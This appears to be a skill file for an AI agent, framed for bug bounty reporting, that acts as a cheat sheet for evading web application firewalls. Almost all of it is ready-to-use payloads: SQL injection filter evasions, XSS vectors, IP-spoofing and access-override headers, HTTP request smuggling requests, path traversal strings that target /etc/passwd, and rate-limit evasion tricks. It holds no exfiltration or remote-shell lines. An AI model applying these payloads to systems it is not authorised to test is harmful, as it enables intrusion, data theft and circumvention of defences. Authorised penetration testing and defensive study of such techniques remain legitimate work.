---
name: waf-bypass
description: "Techniques for bypassing Web Application Firewalls and security filters"
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


# WAF Bypass Techniques

## Encoding Bypasses

### URL Encoding

```
' → %27
" → %22
< → %3c
> → %3e
/ → %2f
```

### Double Encoding

```
' → %27 → %2527
< → %3c → %253c
```

### Unicode Encoding

```
' → %u0027
< → %u003c
/ → %u002f
```

### HTML Entities

```
' → &#39; → &#x27;
< → &#60; → &#x3c;
> → &#62; → &#x3e;
```

### Mixed Encoding

Combine different encodings:
```
<script> → %3Cscript%3E → %253Cscript%253E
```

## SQL Injection Bypasses

### Whitespace Alternatives

```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users
SELECT%0ausername%0aFROM%0ausers
```

### Comment Variations

```sql
/*!50000SELECT*/ username FROM users
SELECT--+%0ausername FROM users
SELECT#%0ausername FROM users
```

### Case Manipulation

```sql
SeLeCt UsErNaMe FrOm UsErS
select USERNAME from USERS
```

### Function Alternatives

```sql
-- Instead of CONCAT
CONCAT('a','b') → 'a'||'b' → CONCAT_WS('','a','b')

-- Instead of SUBSTRING
SUBSTRING(x,1,1) → MID(x,1,1) → LEFT(x,1)

-- Instead of SLEEP
SLEEP(5) → BENCHMARK(10000000,SHA1('x'))
```

### Keyword Splitting

```sql
SEL/**/ECT
UN/**/ION
```

## XSS Bypasses

### Tag Alternatives

```html
<script> blocked? Try:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video onloadstart=alert(1) src=x>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### Event Handler Alternatives

```html
onclick blocked? Try:
onmouseover, onfocus, onblur, onerror
ondrag, ondragend, ondragenter
onwheel, onscroll, oncopy, onpaste
```

### No Parentheses

```html
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

### No Quotes

```html
<svg onload=alert(1)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

### No Spaces

```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

## Header Manipulation

### IP Spoofing

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Method Override

```
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
X-HTTP-Method: PATCH
```

### Path Override

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## Request Smuggling

### CL.TE (Content-Length, Transfer-Encoding)

Frontend uses Content-Length, backend uses Transfer-Encoding:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL

Frontend uses Transfer-Encoding, backend uses Content-Length:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## Content Type Tricks

```
# JSON to form data
Content-Type: application/json
{"test":"payload"}

Content-Type: application/x-www-form-urlencoded
test=payload

# XML injection via JSON
Content-Type: application/json
{"test":"<script>alert(1)</script>"}
```

## Path Traversal Bypasses

```
# Basic
../
..\
..%2f
..%5c

# Double encoding
..%252f
..%255c

# Unicode
..%c0%af
..%c1%9c

# Null byte (older systems)
../../../etc/passwd%00.jpg
```

## Rate Limit Bypass

```
# Vary case
/api/login
/API/LOGIN
/Api/Login

# Path variations
/api/login
/api/login/
/api//login
/./api/./login

# HTTP versions
HTTP/1.0 vs HTTP/1.1

# Simultaneous requests
Burst many requests at exact same time
```
